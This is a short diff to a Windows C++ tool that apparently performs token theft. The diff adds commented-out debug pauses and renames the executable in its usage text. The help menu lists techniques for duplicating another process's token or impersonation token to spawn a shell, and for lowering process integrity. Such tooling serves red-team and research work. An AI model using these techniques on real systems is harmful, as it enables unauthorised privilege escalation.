@@ -25,6 +25,7 @@ using namespace std;
 
 void setThreadPrivs(LPCWSTR privname)
 {
+    //cin.get();
     TOKEN_PRIVILEGES tp;
     LUID luid;
     HANDLE pToken;
@@ -61,11 +62,13 @@ void setThreadPrivs(LPCWSTR privname)
     }
     printf("[+] Privilege: %ws added successfully  to the thread!!!\n", privname);
     CloseHandle(pToken);
+   //cin.get();
 }
 
 
 void setProcessPrivs(LPCWSTR privname)
 {
+    //cin.get();
     TOKEN_PRIVILEGES tp;
     LUID luid;
     HANDLE pToken;
@@ -100,6 +103,7 @@ void setProcessPrivs(LPCWSTR privname)
     }
     printf("[+] Privilege: %ws added successfully!!!\n", privname);
     CloseHandle(pToken);
+    //cin.get();
 }
 
 bool MyCreateFileFunc()
@@ -624,11 +628,11 @@ int main(int argc, char* argv[])
     if (argc == 1 || argc < 4 && strcmp(argv[1], "-lcp") != 0)
     {
         printf("Options:\n -p 'process id'\n -cpi 'check process integrity'\n -d 'Technique: duplicate process token (spawns separate shell)'\n -dt 'Technique: duplicate process thread impersonation token and convert to primary token (spawns shell within current console!)'\n -lcp '(!!!Experimental!!!) lower current process integrity by 1 (spawns shellz)'\n -l '(!!!Experimental!!!) lower another program's process integrity by 1 (spawns shellz)'\n");
-        printf("usage: processpoacher.exe -p 1234 -cpi\n");
-        printf("usage: processpoacher.exe -p 1234 -d\n");
-        printf("usage: processpoacher.exe -p 1234 -dt\n");
-        printf("usage: processpoacher.exe -lcp\n");
-        printf("usage: processpoacher.exe -p 1234 -l\n");
+        printf("usage: tokenpoacher.exe -p 1234 -cpi\n");
+        printf("usage: tokenpoacher.exe -p 1234 -d\n");
+        printf("usage: tokenpoacher.exe -p 1234 -dt\n");
+        printf("usage: tokenpoacher.exe -lcp\n");
+        printf("usage: tokenpoacher.exe -p 1234 -l\n");
 
 
         //printf("usage: processpoacher.exe -p 1234 -dp\n");
